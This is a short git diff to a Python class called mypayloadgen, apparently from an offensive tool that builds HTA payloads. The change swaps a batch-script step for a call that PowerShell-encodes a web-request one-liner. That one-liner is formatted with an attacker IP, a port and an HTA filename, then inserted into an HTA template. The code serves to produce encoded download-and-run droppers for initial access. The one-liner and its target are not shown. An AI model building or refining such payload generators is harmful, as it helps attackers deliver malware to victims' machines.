@@ -1,6 +1,8 @@
 import os
 import subprocess
 
+import decoder
+
 class mypayloadgen():
     def __init__(self):
         self.__toCS = "Client\\myclient\\"
@@ -91,16 +93,7 @@ class mypayloadgen():
         #pre-compile config
         subprocess.run(["conf-pexec-hta.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
 
-        with open(os.path.join(self.__parentdir,self.__to_template,self.__pexec_oneliner_template),mode='r') as f:
-            all_of_it = f.read()
-        
-        with open(os.path.join(self.__parentdir,self.__to_tools,self.__pexec_oneliner_template),mode='w') as f:
-            f.write(all_of_it.replace(self.__pexec_oneliner_payload_tag,self.__pexec_oneliner_webrequest.format(self.__pexec_oneliner_ip,self.__pexec_oneliner_port,self.__pexec_hta_filename)))
-
-        output = subprocess.run(["genpexec-hta.bat"], capture_output=True, shell=True, cwd=mycwd)
-        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF
-
-        print(myb64)
+        myb64 = decoder.powershell_encode(self.__pexec_oneliner_webrequest.format(self.__pexec_oneliner_ip,self.__pexec_oneliner_port,self.__pexec_hta_filename))
 
         with open(os.path.join(self.__parentdir,self.__to_template,self.__pexec_hta_template),mode='r') as f:
             all_of_it = f.read()
